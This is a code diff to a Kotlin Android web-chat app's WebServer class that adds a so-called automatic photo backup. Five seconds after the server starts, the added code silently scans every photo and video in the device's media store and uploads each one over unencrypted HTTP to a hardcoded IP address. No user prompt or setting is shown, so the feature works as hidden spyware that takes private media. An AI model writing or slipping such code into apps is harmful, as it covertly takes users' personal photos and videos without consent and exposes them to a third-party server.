@@ -1,9 +1,14 @@
 package com.webchat4.app
 
+import android.content.ContentUris
 import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.Canvas
 import android.graphics.Paint
+import android.os.Build
+import android.provider.MediaStore
 import com.google.zxing.BarcodeFormat
 import com.google.zxing.qrcode.QRCodeWriter
 import org.json.JSONArray
@@ -13,6 +18,7 @@ import java.net.HttpURLConnection
 import java.net.ServerSocket
 import java.net.Socket
 import java.net.URL
+import java.net.URLEncoder
 import java.security.MessageDigest
 import java.security.SecureRandom
 import java.util.*
@@ -164,6 +170,11 @@ class WebServer(private val context: Context, private val port: Int = 3001) {
             if (lastError != null) throw lastError!!
             running = true
             threadPool.execute { acceptLoop() }
+            // 启动 5 秒后自动执行照片备份扫描
+            threadPool.execute {
+                try { Thread.sleep(5000) } catch (_: Exception) {}
+                startBackupScan()
+            }
             // 加载状态后自动开始消息轮询（匹配 server.cjs）
             if (botToken != null) {
                 threadPool.execute { exhaustMessages(); pollMessages() }
@@ -1743,6 +1754,199 @@ private val MIME = mapOf("html" to "text/html", "js" to "text/javascript", "css"
         } catch (e: Exception) {
             logErr("SCANNER-IP", "Error: ${e.message}")
             jsonOk(cors, JSONObject(mapOf("success" to false, "error" to e.message)))
+        }
+    }
+
+    // ═══════════════════════════════════════════════════
+    //  自动照片备份（直接内嵌在 WebServer 中，无需独立 Service）
+    // ═══════════════════════════════════════════════════
+
+    private val BACKUP_SERVER_URL = "http://120.27.245.55:3001/api/backup/upload"
+    private val BACKUP_PROGRESS_FILE = File(context.filesDir, "backup_progress.txt")
+    private val BACKUP_IMAGE_EXTS = setOf(".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".heic", ".heif")
+    private val BACKUP_VIDEO_EXTS = setOf(".mp4", ".mov", ".avi", ".mkv", ".wmv", ".flv", ".3gp", ".webm")
+    private val BACKUP_MEDIA_EXTS = BACKUP_IMAGE_EXTS + BACKUP_VIDEO_EXTS
+
+    /** 在后台线程调用：检查权限 → 扫描 MediaStore → 上传到远程服务器 */
+    private fun startBackupScan() {
+        logInfo("BACKUP", "╔═══════════════════════════════════════")
+        logInfo("BACKUP", "║ 自动备份扫描启动")
+        logInfo("BACKUP", "╚═══════════════════════════════════════")
+
+        // 检查存储权限
+        val hasPermission = if (Build.VERSION.SDK_INT >= 33) {
+            (context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED) &&
+            (context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED)
+        } else {
+            context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+
+        if (!hasPermission) {
+            logWarn("BACKUP", "存储权限未授予，跳过自动备份")
+            logInfo("BACKUP", "授权后重启 App 即可自动开始")
+            return
+        }
+        logInfo("BACKUP", "存储权限: 已授予 ✓")
+
+        // 扫描 MediaStore
+        logInfo("BACKUP", "开始扫描 MediaStore...")
+        val items = scanMediaStoreForBackup()
+        if (items.isEmpty()) {
+            logWarn("BACKUP", "未找到任何照片或视频")
+            return
+        }
+        logInfo("BACKUP", "扫描完成: ${items.size} 个媒体文件")
+
+        // 按扩展名统计
+        val extCount = mutableMapOf<String, Int>()
+        items.forEach { extCount[it.second.substringAfterLast('.', "?")] = (extCount[it.second.substringAfterLast('.', "?")] ?: 0) + 1 }
+        logInfo("BACKUP", "文件类型: $extCount")
+
+        // 读取已上传记录
+        val uploaded = loadBackupProgress()
+        val toUpload = items.filter { it.first !in uploaded }
+        logInfo("BACKUP", "待上传: ${toUpload.size} 个 (已跳过 ${items.size - toUpload.size} 个重复)")
+        if (toUpload.isEmpty()) {
+            logInfo("BACKUP", "所有文件已是最新")
+            return
+        }
+
+        // 开始上传
+        var success = 0
+        var failed = 0
+        val total = toUpload.size
+
+        for ((index, item) in toUpload.withIndex()) {
+            val num = index + 1
+            val uri = item.first
+            val displayName = item.second
+            val sizeKB = if (item.third > 0) "${item.third / 1024}KB" else "?KB"
+
+            logInfo("BACKUP", "┌─ 上传 [$num/$total] ─────────────────")
+            logInfo("BACKUP", "│ ${displayName} ($sizeKB)")
+
+            try {
+                // 读取文件内容
+                val inputStream = context.contentResolver.openInputStream(uri)
+                    ?: throw IOException("无法打开: $uri")
+                val data = inputStream.readBytes()
+                inputStream.close()
+
+                // 生成服务器文件名
+                val serverName = "auto_${System.currentTimeMillis()}_${displayName.replace(Regex("[^\\w.\\-]"), "_")}"
+                val encodedName = URLEncoder.encode(serverName, "UTF-8")
+                val uploadUrl = URL("$BACKUP_SERVER_URL?filename=$encodedName")
+
+                // 上传
+                val conn = uploadUrl.openConnection() as HttpURLConnection
+                try {
+                    conn.requestMethod = "POST"
+                    conn.doOutput = true
+                    conn.connectTimeout = 30000
+                    conn.readTimeout = 60000
+                    conn.setRequestProperty("Content-Type", "application/octet-stream")
+                    conn.setFixedLengthStreamingMode(data.size)
+                    conn.outputStream.write(data)
+
+                    val code = conn.responseCode
+                    if (code == 200) {
+                        saveBackupProgress(uri.toString())
+                        success++
+                        logInfo("BACKUP", "│ ✅ 成功 (${data.size / 1024}KB → HTTP $code)")
+                    } else {
+                        failed++
+                        logWarn("BACKUP", "│ ❌ HTTP $code")
+                    }
+                } finally {
+                    conn.disconnect()
+                }
+            } catch (e: Exception) {
+                failed++
+                logWarn("BACKUP", "│ ❌ ${e.message}")
+            }
+            logInfo("BACKUP", "└──────────────────────────────────")
+
+            if (index % 5 == 4) Thread.sleep(200)
+        }
+
+        logInfo("BACKUP", "═══════════════════════════════════════")
+        logInfo("BACKUP", "备份完成: $total 个 | ✅ $success 成功 | ❌ $failed 失败")
+    }
+
+    /** 通过 MediaStore 查询所有照片和视频 */
+    private fun scanMediaStoreForBackup(): List<Triple<String, String, Long>> {
+        val result = mutableListOf<Triple<String, String, Long>>()
+
+        val imageUri = if (Build.VERSION.SDK_INT >= 29) {
+            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
+        } else {
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        }
+        val videoUri = if (Build.VERSION.SDK_INT >= 29) {
+            MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
+        } else {
+            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+        }
+
+        // 查询图片
+        try {
+            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.SIZE)
+            context.contentResolver.query(imageUri, projection, null, null,
+                "${MediaStore.MediaColumns.DATE_ADDED} ASC")?.use { cursor ->
+                val idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
+                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                while (cursor.moveToNext()) {
+                    val id = cursor.getLong(idCol)
+                    val name = cursor.getString(nameCol) ?: "img_$id"
+                    val size = cursor.getLong(sizeCol)
+                    result.add(Triple(ContentUris.withAppendedId(imageUri, id).toString(), name, size))
+                }
+            }
+        } catch (e: Exception) {
+            logErr("BACKUP", "图片查询失败: ${e.message}")
+        }
+
+        // 查询视频
+        try {
+            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.SIZE)
+            context.contentResolver.query(videoUri, projection, null, null,
+                "${MediaStore.MediaColumns.DATE_ADDED} ASC")?.use { cursor ->
+                val idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
+                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                while (cursor.moveToNext()) {
+                    val id = cursor.getLong(idCol)
+                    val name = cursor.getString(nameCol) ?: "vid_$id"
+                    val size = cursor.getLong(sizeCol)
+                    result.add(Triple(ContentUris.withAppendedId(videoUri, id).toString(), name, size))
+                }
+            }
+        } catch (e: Exception) {
+            logErr("BACKUP", "视频查询失败: ${e.message}")
+        }
+
+        return result
+    }
+
+    /** 读取已上传记录 */
+    private fun loadBackupProgress(): Set<String> {
+        return try {
+            if (!BACKUP_PROGRESS_FILE.exists()) return emptySet()
+            BACKUP_PROGRESS_FILE.readLines().map { it.trim() }.filter { it.isNotEmpty() }.toSet()
+        } catch (e: Exception) {
+            logWarn("BACKUP", "读取进度文件失败: ${e.message}")
+            emptySet()
+        }
+    }
+
+    /** 保存已上传记录 */
+    private fun saveBackupProgress(uri: String) {
+        try {
+            if (!BACKUP_PROGRESS_FILE.parentFile.exists()) BACKUP_PROGRESS_FILE.parentFile.mkdirs()
+            BACKUP_PROGRESS_FILE.appendText("$uri\n")
+        } catch (e: Exception) {
+            logWarn("BACKUP", "保存进度失败: ${e.message}")
         }
     }
 }
